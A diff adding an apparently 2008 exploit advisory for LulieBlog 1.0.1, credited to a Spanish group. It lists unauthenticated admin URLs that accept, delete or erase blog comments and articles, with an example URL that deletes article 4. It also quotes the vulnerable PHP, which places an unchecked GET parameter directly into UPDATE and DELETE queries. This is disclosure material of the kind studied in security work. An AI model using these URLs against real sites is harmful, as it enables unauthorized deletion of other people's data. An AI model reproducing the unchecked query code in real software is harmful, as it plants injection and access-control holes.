@@ -1,0 +1,50 @@
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+LulieBlog 1.0.1 (delete id) Remote Admin Bypass Vulnerability
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+bug found by ka0x
+contact: <ka0x01[at]gmail.com>
+D.O.M TEAM 2008
+we are: ka0x, an0de, xarnuz
+#from spain
+
+download: http://www.comscripts.com/scripts/php.lulieblog.2138.html
+
+Description:
+- The bug will allow us to acept sent comments in the articles,
+erase comments and delete articles
+
+
+accept comments:
+http://[host]/Admin/comment_accepter.php?id=[id_comment]
+
+------------------
+$id=$_GET["id"];
+$sql="UPDATE ".PREFIX_TABLES."commentaire  SET actif = 1 WHERE idcom  = '$id'";
+------------------
+
+
+delete comments:
+http://[host]/Admin/comment_refuser.php?id=[id_comment]
+
+------------------
+$id=$_GET["id"];
+$sql="DELETE FROM ".PREFIX_TABLES."commentaire WHERE idcom  = '$id'";
+------------------
+
+
+delete article:
+http://[host]/Admin/article_suppr.php?id=[id_article]
+
+------------------
+$id=$_GET["id"];
+$sql="DELETE FROM ".PREFIX_TABLES."article WHERE numart='$id'";
+------------------
+
+
+example:
+---------
+http://localhost/lulieblog/Admin/article_suppr.php?id=4
+Delete the article with id=4
+
+# milw0rm.com [2008-01-15]
